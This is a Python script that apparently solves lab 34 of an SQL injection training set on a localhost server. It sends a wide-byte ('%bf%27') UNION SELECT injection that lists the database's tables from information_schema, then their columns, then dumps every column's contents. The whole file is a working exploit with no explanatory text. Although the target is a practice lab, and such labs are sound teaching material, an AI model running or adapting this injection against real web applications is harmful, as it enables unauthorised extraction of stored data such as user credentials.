import requests
import base64

get_table = "(select group_concat(table_name) from information_schema.tables where table_schema=database())"
get_column = "(select group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() limit {},1))"
get_secret = "(select group_concat({0}) from {1})"
url = "http://localhost:1234/Less-34/?id=0"
session = requests.Session()

payload = "%bf%27 union select 1,{},3;--+"
data={"uname":"","passwd":""}
response = requests.post(url+payload.format(get_table))
while('Subquery returns more than 1 row' in response.text):
    response = requests.post(url+payload.format(get_table))
temp = response.text[565:-680]
tables = temp.split(',')
print("Tables :", *tables)
for i in range(len(tables)):
    print("From Table", tables[i], ": ")
    find = get_column.format(i)
    response = requests.post(url+payload.format(find))
    while('Subquery returns more than 1 row' in response.text):
        response = requests.post(url+payload.format(find))
    temp = response.text[565:-920]
    columns = temp.split(',')
    print("Columns : ", *columns)
    for j in columns:
        print("From Column", j, ": ")
        find = get_secret.format(j, tables[i])
        response = requests.post(url+payload.format(find))
        while('Subquery returns more than 1 row' in response.text):
            response = requests.post(url+payload.format(find))
        print(response.text[565:-314-len(payload.format(find))*3])
